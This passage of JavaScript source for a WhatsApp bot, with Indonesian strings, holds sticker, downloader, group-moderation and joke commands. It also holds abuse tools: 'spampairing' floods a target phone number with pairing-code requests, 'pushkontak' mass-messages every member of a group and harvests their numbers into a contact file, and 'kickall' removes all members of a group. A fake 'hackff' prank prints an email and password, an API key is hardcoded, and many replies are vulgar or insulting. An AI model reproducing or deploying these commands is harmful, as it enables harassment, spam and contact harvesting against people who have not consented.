if (!Access) return reply(mess.owner)
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          conn.chatModify({
            delete: true,
            lastMessages: [{
              key: m.key,
              messageTimestamp: m.messageTimestamp
            }]
          }, users);
          await reply(`done puki`);
        }
        break;
       
      case "ht":
        {
          if (!m.isGroup) return reply(mess.group);

          let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : "";
          conn.sendMessage(m.chat, {
            text: `@${m.chat}\n${text}`,
            contextInfo: {
              mentionedJid: mem,
              groupMentions: [{
                groupSubject: `bokep`,
                groupJid: m.chat
              }]
            }
          });
        }
        break; 
        
      case "tagall": {
          if (!m.isGroup) return reply(mess.only.group);         
          me = m.sender;
          let teks = ` `;
          for (let mem of participants) {
            teks += `🤤 @${mem.id.split("@")[0]}\n`;
          }
          conn.sendMessage(m.chat, {
            text: teks,
            mentions: participants.map(a => a.id)
          }, {
            quoted: m
          });
        }
        break;   
                                                       
case 's': case 'sticker': {
  if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: "By:", author: "Vanzz" })
} else {
reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break;

case 'getpp':{
if (!text) return m.reply('mna no yang mau lu ambil pp nya kocak');
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await conn.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
conn.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;

case "pay": {
let anj = `
Dana : 085693454019
Gopay : 6285814573477`;
conn.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/l5zmvr.jpeg" },
        caption: anj,
                    })
                    }
break            
          
case "cekidgb": {
let gcall = Object.values(await conn.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*Nama* : ${u.subject}\n *ID* : ${u.id}\n`
})
m.reply(listgc)
}
break;                                                    

case "pushkontak": {
if (!Access) return reply(mess.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.cekid* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await conn.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./start/lib/contacts.json', JSON.stringify(contacts))
await conn.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(Number(delay))
}}
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/contacts.vcf", "")
}
break;

      case "savekontak": {
          if (!m.isGroup) {
            return reply(`Fitur Ini Khusus Group`);
          }
          let cmiggc = await conn.groupMetadata(m.chat);
          let orgiggc = participants.map(a => a.id);
          vcard = "";
          noPort = 0;
          for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
          }
          let nmfilect = "./start/lib/contacts.vcf";
          fs.writeFileSync(nmfilect, vcard.trim());
          await sleep(2000);
          conn.sendMessage(m.sender, {
            document: fs.readFileSync(nmfilect),
            mimetype: "text/vcard",
            fileName: "Contact.vcf",
            caption: "GROUP: *" + cmiggc.subject + "*\nMEMBER: *" + cmiggc.participants.length + "*"
          }, {
            ephemeralExpiration: 86400,
            quoted: m
          });
          fs.unlinkSync(nmfilect);
        }
        break;

case 'spampairing': {
if (!premonly) return reply(mess.premium)
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('done abangkuh');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

  case "spamreactch": {

if (!text) return m.reply("contoh : .spamreactch linkpesan 😹")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await conn.newsletterMetadata("invite", result)

await conn.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

case 'cekcantik': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} conn`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v', '30% Semangat Kaka Merawat Dirinya><', '20% Semangat Ya Kaka👍', '40% Wahh Kaka><', '50% kaka cantik deh><', '60% Hai Cantik🐊', '70% Hai Ukhty🐊', '62% Kakak Cantik><', '74% Kakak ni cantik deh><', '83% Love You Kakak><', '97% Assalamualaikum Ukhty🐊', '100% Kakak Pake Susuk ya??:v', '29% Semangat Kakak:)', '94% Hai Cantik><', '75% Hai Kakak Cantik', '82% wihh Kakak Pasti Sering Perawatan kan??', '41% Semangat:)', '39% Lebih Semangat🐊']
const tik = await pickRandom(can)
reply(`Nama : *${text}*\nCantik : *${tik}*`)
}
break
case 'cekganteng': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Vanzz`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gan = ['10% , wkwkwk jelek bet kacung 😹😹', '30% , ga jelek - jelek amat lh 😹😹', '20% , wkwk kacung buluk bet muka lu 😹😹', '40% , lumayan si, tpi tetep buluk muka lu 😹😹 ', '50% , pasti outfit ny starboy kampung 😹😹', '60% , mayan si, tpi ttp gantengan vanzz 😹😹', '70% , mayan lh muka pas"an', 'cuci muka lu sono', '74% , mayan tuh, tpi ttp gantengan vanzz 😹😹', '83% , whop abang - abangan ni pasti', '97% , anjir cocok ni jdi pemain', '100% , wow tpi vanzz 1000% kegantengan ny 😹', '29% , banyakin cuci muka pake oli biar putih muka lu noh', '94% , whop calon - calon pemain ni', '75% , muka standar 😹', '82% mayan tuh bersyukur dek', '41% wkwk muku lu noh ky aspal 😹', '39% pasti sering nonton bokep nih 😹']
const teng = await pickRandom(gan)
reply(`Nama : *${text}*\nGanteng : *${teng}*`)
}
break

case 'cekdongo': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} nama`)
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const don = ['10% masih aman', '30% mayan aman lah', '20% aman lah', '40% Kata Vanzz Lu dongo `AWOKWOK`', '50% wkwkk Vanzz Liat Nih Ada Orang Dongo', '60% Jir Dongo Bet Ni Orang', '70% Ajg! Ini Seriusan Dongonya Segini?', '62% Dongo Brutal?', '88% Buset dah', '97% Dongo Bet! Vanzz Aja Dongo nya cuman 10%... Masa Lu 97% Jir', '100% Ga Bisa Dikatakan Lagi Dongo Nya']
const go = await pickRandom(don)
reply(`Nama : *${text}*\nDongo : *${go}*`)
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return reply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Penyepong Vanzz",
"Penyepong Vanzz",
"Penyepong Vanzz",
"Ambatukam",
"rawa rontek",
"Botol yakult",
"Burung Sengkleng",
"Kontol jepang",
"Tung tung tung sahur",
"Amba Jomok 🤤",
"Jarjit Pembokep",
"Ihsan gendut",
"Kereta Ambalabu",
"Ambalabu kontol",
"Kontol Korea",
"Karung Liar",
"Sapi plenger",
"Anjing Jancok",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  reply(kodamn)
}
break;
 
case 'addpremium': case 'addprem':
if (!Access) return reply(mess.owner)
  if (!args[0]) return reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = text.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await conn.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return reply(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(Premium));
  reply(`anjai ${numero} dh jadi ade - ade vanzz lu 😹`);
  break;

case "addkacung":
if (!Access) return reply(mess.owner)
  if (!args[0]) return reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero = text.split("|")[0].replace(/[^0-9]/g, '');
  let Innvalid = await conn.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Innvalid.length == 0) return reply(`Number Invalid!!!`);
  Listbot.push(numero);
  fs.writeFileSync('./start/lib/database/listbot.json', JSON.stringify(Listbot));
  reply(`anjai ${numero} dh jadi ade - ade vanzz lu 😹`);
  break;

case "delkacung" :
if (!Access) return reply(mess.owner)
  if (!args[0]) return reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = text.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Listbot.indexOf(numero2);
  Listbot.splice(numeroX, 1);
  fs.writeFileSync('./start/lib/database/listbot.json', JSON.stringify(Premium));
  reply(`wkwkwk ${numero2} ksian di delprem 😹`);
  break;

case 'delpremium': case 'delprem':
if (!Access) return reply(mess.owner)
  if (!args[0]) return reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62 xxx-xxxx-xxxx`);
  numero2 = text.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./start/lib/database/premium.json', JSON.stringify(Premium));
  reply(`wkwkwk ${numero2} ksian di delprem 😹`);
  break;                                     
// end case add/md

// start case bug

case "play": {

if (!text) return reply(`*Penggunaan Salah!*\ncontoh: ${prefix + command} Night change`)
        conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
var anu = await ytdl.ytmp3(`${rees.url}`)
let urlMp3 = anu.download.url
 await conn.sendMessage(m.chat, {
          audio: {
            url: urlMp3
          },
          mimetype: 'audio/mpeg',
          fileLength: 99999999999999,
           contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: "120363423889841112@g.us" }, forwardedNewsletterMessageInfo: { newsletterName: "Vanzz", newsletterJid: global.idSaluran }, 
externalAdReply: {
title: `${rees.title}`, 
thumbnailUrl: rees.thumbnail, 
renderLargerThumbnail: true, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}}, {quoted: m })
 }
if (anu.status) {

} else {
return m.reply("Error! Result Not Found")
}
break

/*  case 'play': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');
  try {
        conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
      
    let res = await fetch(`https://ochinpo-helper.hf.space/yt?query=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error('API utama gagal');
    let json = await res.json();
    if (!json.success || !json.result) throw new Error('Respon API utama tidak valid');
    const {
      title,
      url,
      image,
      duration,
      author,
      download
    } = json.result;
    const thumbnail = await (await fetch(image)).buffer();
    await conn.sendMessage(m.chat, {
      audio: { url: download.audio },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title,
          body: `${author.name} • ${duration.timestamp}`,
          thumbnail,
          mediaUrl: url,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: url
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.warn('Fallback to Nekorinn API:', e.message);
    try {
      let res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
      let data = await res.json();
      if (!data.status || !data.result) throw new Error('Respon cadangan 1 tidak valid');
      const { title, channel, duration, imageUrl, link } = data.result.metadata;
      const downloadUrl = data.result.downloadUrl;
      const thumbnail = await (await fetch(imageUrl)).buffer();
      await conn.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${title}.mp3`,
        ptt: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title,
            body: `${channel} • ${duration}`,
            thumbnail,
            mediaUrl: link,
            mediaType: 2,
            renderLargerThumbnail: true,
            sourceUrl: link
          }
        }
      }, { quoted: m });
    } catch (err) {
      console.warn('Fallback to Diioffc API:', err.message);
      try {
        const res2 = await fetch(`https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`);
        if (!res2.ok) return m.reply('Gagal mengambil data dari server cadangan.');
        const json = await res2.json();
        if (!json.status || !json.result) return m.reply('Lagu tidak ditemukan!');
        const { title, author, duration, thumbnail: thumb, url, download } = json.result;
        const thumbnail = await (await fetch(thumb)).buffer();
        await conn.sendMessage(m.chat, {
          audio: { url: download.url },
          mimetype: 'audio/mpeg',
          fileName: download.filename || `${title}.mp3`,
          ptt: true,
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
              title,
              body: `${author.name} • ${duration.timestamp}`,
              thumbnail,
              mediaUrl: url,
              mediaType: 2,
              renderLargerThumbnail: true,
              sourceUrl: url
            }
          }
        }, { quoted: m });
      } catch (finalErr) {
        console.error(finalErr);
        m.reply('Terjadi kesalahan saat memproses permintaanmu.');
      }
    }
  }
}
break;

*/

    case 'opengc':
    case 'gcopen':
    case 'open':
    case 'bukagc':
    case 'buka': {
          if (!m.isGroup) return reply(mess.group);
      if (!Access && !isAdmins) return onlyAdmin()
      if (!isBotAdmins) return onlyBotAdmin()
      conn.groupSettingUpdate(m.chat, 'not_announcement')
      m.reply(`dh gw buka tu lain kali jn spam lagi ye 😹😹`)
    }
    break

    case 'close': {
          if (!m.isGroup) return reply(mess.group);
      if (!Access && !isAdmins) return onlyAdmin()
      if (!isBotAdmins) return onlyBotAdmin()
      conn.groupSettingUpdate(m.chat, 'announcement')
      m.reply(`wkwk di tutup mknny jan spam tolol 😹😹`)
    }
    break

case 'mediafire': {
  try {
    if (!text) return m.reply(`Contoh: ${prefix + command} linknya`)
    if (!text.includes('mediafire.com')) return m.reply('Harus berupa link MediaFire!')

    // react loading
    await conn.sendMessage(from, {
      react: {
        text: "🔎",
        key: m.key
      }
    })

    const apikey = '52c44808694aebb70360d04ffb43114561ecacab49dd732158'
    const apiUrl = `https://api.velixs.com/mediafire?apikey=${apikey}&url=${encodeURIComponent(text)}`

    let api = await fetchJson(apiUrl)
    if (!api.status) return m.reply('Gagal mengambil data MediaFire!')

    let data = api.data
    let fileNama = data.title || 'file'
    let downloadUrl = data.link

    let extension = fileNama.split('.').pop().toLowerCase()

    let res = await axios.get(downloadUrl, {
      responseType: 'arraybuffer'
    })
    let media = Buffer.from(res.data)

    let mimetype = 'application/octet-stream'
    if (extension === 'mp4') mimetype = 'video/mp4'
    else if (extension === 'mp3') mimetype = 'audio/mpeg'
    else if (extension === 'apk') mimetype = 'application/vnd.android.package-archive'
    else if (extension === 'zip') mimetype = 'application/zip'

    await conn.sendMessage(m.chat, {
      document: media,
      fileName: fileNama,
      mimetype,
      caption: `📦 *MediaFire Downloader*\n\n📄 Nama: ${fileNama}\n📏 Size: ${data.size}`
    }, {
      quoted: m
    })

  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat download MediaFire!')
  }
}
break

    case 'tiktok': {
      try {
        if (!text) return m.reply(`Contoh: ${prefix + command} linknya`)
        if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
             conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })

        let jir = await tiktokDl(text)
        if (jir.status && jir.data.length > 0) {
          const nowmVideo = jir.data.find(item => item.type === 'nowatermark')
          if (nowmVideo) {
            let caption = `🎬 *Video TikTok* \n\n`
            caption += `*Title:* ${jir.title}\n`
            caption += `*Music:* ${jir.music_info.title} - ${jir.music_info.author}\n`
            caption += `*Music URL:* ${jir.music_info.url}\n`

            return await conn.sendMessage(
              m.chat, {
                video: {
                  url: nowmVideo.url
                },
                caption: caption,
              }, {
                quoted: m
              }
            )
          }
        }

        throw new Error('Terjadi kesalahan')
      } catch (err) {
        console.error('Terjadi kesalahan: ', err)
        m.reply('Terjadi kesalahan')
      }
    }
    break;

    case 'happymod': {
      try {
        if (!text) return m.reply(`Contoh: ${prefix + command} mobile legends`)
              conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
        let result = await happymod(text)
        let teks = result.map((v, i) => {
          return `
*${i + 1}.* ${v.name}
- Link: ${v.link}
`.trim()
        }).filter(v => v).join('\n\n\n')
        await m.reply(teks)
      } catch (err) {
        m.reply('Terjadi kesalahan')
      }
    }
    break;

case 'cekstress':
case 'cekrajaiblis':
case 'ceksange':
case 'cekgay':
case 'cekkaya':
case 'ceklesbi': {
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var sangek = ['5 %', '10 %', '15 %', '20 %', '25 %', '30 %', '35 %', '40 %', '45 %', '50 %', '55 %', '60 %', '65 %', '70 %', '75 %', '80 %', '85 %', '90 %', '95 %', '100 %']
var sange = sangek[Math.floor(Math.random() * sangek.length)]
m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break;

case 'hackff':
{
 if (!text) return reply('Masukkan ID target Free Fire!\nContoh: hackff 123456789');

 const id = text.trim();
 const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)); // langsung di sini

 reply(`🔍 Menghubungkan ke server Free Fire Garena...`);

 await sleep(2000);
 await reply(`🛡️ Menembus sistem keamanan Garena...`);
 
 await sleep(2000);
 await reply(`💉 Menyuntikkan script bypass...`);
 
 await sleep(2000);
 await reply(`📡 Melacak UID: ${id}...`);
 
 await sleep(2000);
 await reply(`Sudah Mendapatkan Informasi Akun`);
 
 await sleep(2000);
 await reply(`UID: ${id}\n Email: rasyasarjana0021@gmail.com\n Password: Rasyaganteng51\n Platform: Google`);
}
break;

case'cekkontol': 
 if (!text) return m.reply('Nama nya mana yang mau di cek kontol nya')
function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
}

	
 m.reply(`
Nama : ${text}
Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}`)
break;

case "qc": {        
if (!quoted){
const getname = await conn.getName(mentionUser[0])
var ppuser
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://l.top4top.io/p_3438tcdbc1.jpg' 
}
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
conn.sendImageAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
conn.sendImageAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break

    case 'brat': {
      if (!text) return m.reply(`Contoh: ${prefix + command} kontol`)
      if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
            conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
      function Enc(type) {
  return encodeURIComponent(type)
}
      let res = await fetch(`https://aqul-brat.hf.space/?text=${Enc(text)}`)
      let buffer = await res.buffer()
      await conn.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author
      })
    }
    break;

    case 'bratvid': {
      if (!text) return m.reply(`Contoh: ${prefix + command} kontol`)
      if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
            conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })

      function Enc(type) {
  return encodeURIComponent(type)
}

      const words = text.split(" ")
      const tempDir = path.join(process.cwd(), 'x-system')
      if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
      const framePaths = []

      try {
        for (let i = 0; i < words.length; i++) {
          const currentText = words.slice(0, i + 1).join(" ")

          const res = await axios.get(
            `https://aqul-brat.hf.space/?text=${Enc(currentText)}`, {
              responseType: "arraybuffer"
            }
          ).catch((e) => e.response)

          const framePath = path.join(tempDir, `frame${i}.mp4`)
          fs.writeFileSync(framePath, res.data)
          framePaths.push(framePath)
        }

        const fileListPath = path.join(tempDir, "filelist.txt")
        let fileListContent = ""

        for (let i = 0; i < framePaths.length; i++) {
          fileListContent += `file '${framePaths[i]}'\n`
          fileListContent += `duration 0.5\n`
        }

        fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
        fileListContent += `duration 1.5\n`

        fs.writeFileSync(fileListPath, fileListContent)
        const outputVideoPath = path.join(tempDir, "output.mp4")

        execSync(
          `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset superfast -pix_fmt yuv420p ${outputVideoPath}`
        )

        await conn.sendImageAsSticker(m.chat, outputVideoPath, m, {
          packname: packname,
          author: author
        })

        framePaths.forEach((frame) => {
          if (fs.existsSync(frame)) fs.unlinkSync(frame)
        })
        if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
        if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
      } catch (err) {
        console.error(err)
        m.reply('Terjadi kesalahan')
      }
    }
    break;

    case 'bratcewe': {
      if (!text) return m.reply(`Contoh: ${prefix + command} halo`)
      if (text.length > 50) return m.reply(`Karakter terbatas, max 50!`)
            conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })

async function Brats(teks) {
    const folderPath = './start/'
    if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true })

    const filePath = `${folderPath}${randomKarakter(4)}.jpg`

    const response = await axios.get('https://files.catbox.moe/vkoaby.jpg', { responseType: 'arraybuffer' })
    fs.writeFileSync(filePath, Buffer.from(response.data))

    try {
    const { createCanvas, loadImage, registerFont } = require('canvas')
        const img = await loadImage(filePath)
        const canvas = createCanvas(img.width, img.height)
        const ctx = canvas.getContext('2d')

        ctx.drawImage(img, 0, 0, img.width, img.height)

        const paperX = img.width * 0.285
        const paperY = img.height * 0.42
        const paperWidth = img.width * 0.42
        const paperHeight = img.height * 0.32

        let fontSize = Math.min(paperWidth / 6.5, paperHeight / 3.2)
        ctx.font = `${fontSize}px MyFont`
        ctx.fillStyle = 'black'

        const maxWidth = paperWidth * 0.88
        let words = teks.split(' ')
        let lines = []
        let line = ''

        for (let word of words) {
            let testLine = line + (line ? ' ' : '') + word
            let testWidth = ctx.measureText(testLine).width

            if (testWidth > maxWidth && line) {
                lines.push(line)
                line = word
            } else {
                line = testLine
            }
        }
        if (line) lines.push(line)

        while (lines.length * fontSize > paperHeight * 0.85) {
            fontSize -= 2
            ctx.font = `${fontSize}px MyFont`

            let tempLines = []
            let tempLine = ''
            for (let word of words) {
                let testLine = tempLine + (tempLine ? ' ' : '') + word
                let testWidth = ctx.measureText(testLine).width

                if (testWidth > maxWidth && tempLine) {
                    tempLines.push(tempLine)
                    tempLine = word
                } else {
                    tempLine = testLine
                }
            }
            if (tempLine) tempLines.push(tempLine)
            lines = tempLines
        }

        let lineHeight = fontSize * 1.15
        let textHeight = lines.length * lineHeight

        let textStartY = paperY + (paperHeight - textHeight) / 2 + (lines.length > 2 ? 270 : 275)

        ctx.save()
        ctx.translate(paperX + paperWidth / 2 + 24, textStartY)
        ctx.rotate(0.12)

        ctx.textAlign = 'center'

        ctx.shadowColor = 'rgba(0, 0, 0, 0.3)'
        ctx.shadowBlur = 3
        ctx.shadowOffsetX = 2
        ctx.shadowOffsetY = 2

        for (let i = 0; i < lines.length; i++) {
            ctx.fillText(lines[i], 0, i * lineHeight)
        }
        ctx.restore()

        return canvas.toBuffer()
    } finally {
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath)
    }
}

      Brats(text).then(async buffer => {
        await conn.sendImageAsSticker(m.chat, buffer, m, {
          packname: packname,
          author: author
        })
      }).catch(err => {
        throw Error('Terjadi kesalahan: ' + err)
      })
    }
    break;

    case 'add': {
          if (!m.isGroup) return reply(mess.group);
      if (!Access && !isAdmins) return onlyAdmin()
      if (!isBotAdmins) return onlyBotAdmin()
      let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      try {
        const participants = await conn.groupMetadata(m.chat)
        if (participants.participants.some(p => p.id === users)) {
          return m.reply(' udh msuk tolol dia.')
        }
        await conn.groupParticipantsUpdate(m.chat, [users], 'add')
        m.reply('donee')
      } catch (err) {
        m.reply('Terjadi kesalahan: ' + err)
      }
    }
    break;

    case 'kick': {
          if (!m.isGroup) return reply(mess.group);
      if (!Access && !isAdmins) return onlyAdmin()
      if (!isBotAdmins) return onlyBotAdmin()

      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

      try {
        const participants = await conn.groupMetadata(m.chat)
        const ownerNumber = global.owner + '@s.whatsapp.net'

        if (users === ownerNumber || users === botNumber) {
          return m.reply('kocak lu mau ngeluarin admin/bot? lu aj gw kick mau? 😹.')
        }

        if (!participants.participants.some(p => p.id === users)) {
          return m.reply('ga ada di grup tolol yang bner lh kick orng.')
        }

        await conn.groupParticipantsUpdate(m.chat, [users], 'remove')
        m.reply('donee')
      } catch (err) {
        m.reply('Terjadi kesalahan.')
      }
    }
    break;

case 'kickall': {  
  try {
if (!Access) return reply(mess.owner)
    let gcownMeta = await conn.groupMetadata(m.chat)  
    const users = gcownMeta.participants.map(u => u.id).filter(v => v !== conn.user.jid)  
    await conn.groupParticipantsUpdate(m.chat, users, 'remove')  
    await m.reply('donee')  
  } catch {
    await m.reply('Terjadi kesalahan: ID group tidak valid, bot tidak bergabung ke group, atau bot tidak menjadi admin group.')
  }
}  
break;

    case 'cekhobi':
    case 'cekhoby':
    case 'cekhobby': {
